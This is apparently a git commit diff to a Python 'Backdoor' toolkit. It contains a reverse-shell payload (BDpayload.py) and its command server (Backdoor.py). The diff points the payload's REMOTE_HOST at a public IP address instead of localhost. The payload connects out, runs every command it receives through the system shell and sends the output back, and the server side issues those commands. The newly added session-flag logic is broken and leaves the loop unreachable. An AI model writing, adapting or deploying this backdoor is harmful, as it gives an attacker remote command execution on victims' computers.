7af57248a5d61c439ba088a39b79ee4d87b637af
Phroggy <thatguyyoublocked@outlook.com>
2023-03-23 15:41:23 +0800

    fggv

--- toolkit/Backdoor/BDpayload.py
+++ toolkit/Backdoor/BDpayload.py
@@ -4,24 +4,29 @@ import socket
 import subprocess
 
 # Setting Up IP/Sockets
-REMOTE_HOST = '127.0.0.1' 
+REMOTE_HOST = '119.94.11.57' 
 REMOTE_PORT = 8081 # 2222
 client = socket.socket()
-
-
+insesh = False
 
 # Initializing Connection
-print("[-] Connection Initiating...")
-client.connect((REMOTE_HOST, REMOTE_PORT))
-print("[-] Connection initiated!")
+def findhost():
+    print("[-] Connection Initiating...")
+    try:
+        client.connect((REMOTE_HOST, REMOTE_PORT))
+        print("[!] Connection initiated!")
+        insesh = True
+    except:
+        return
 
 # Runtime Loop
-while True:
+
+while insesh == True:
     print("[-] Awaiting commands...")
     command = client.recv(1024)
     command = command.decode()
     op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
     output = op.stdout.read()
     output_error = op.stderr.read()
-    print("[-] Sending response...")
+    print("[+] Sending response...")
     client.send(output + output_error)
--- toolkit/Backdoor/Backdoor.py
+++ toolkit/Backdoor/Backdoor.py
@@ -5,6 +5,7 @@ system("color 0a")
 
 HOST = '127.0.0.1' # '192.168.43.82'
 PORT = 8081 # 2222
+insesh = False
 
 new_port = input('Input Host Port (Blank if default).')
 if (new_port != "\n"):
@@ -23,7 +24,7 @@ client, client_addr = server.accept()
 print(f'[+] {client_addr} Client connected to the server')
 
 # Sending and receiving commands in an infinite loop
-while True:
+while insesh == True:
     command = input('Enter Command : ')
     command = command.encode()
     client.send(command)
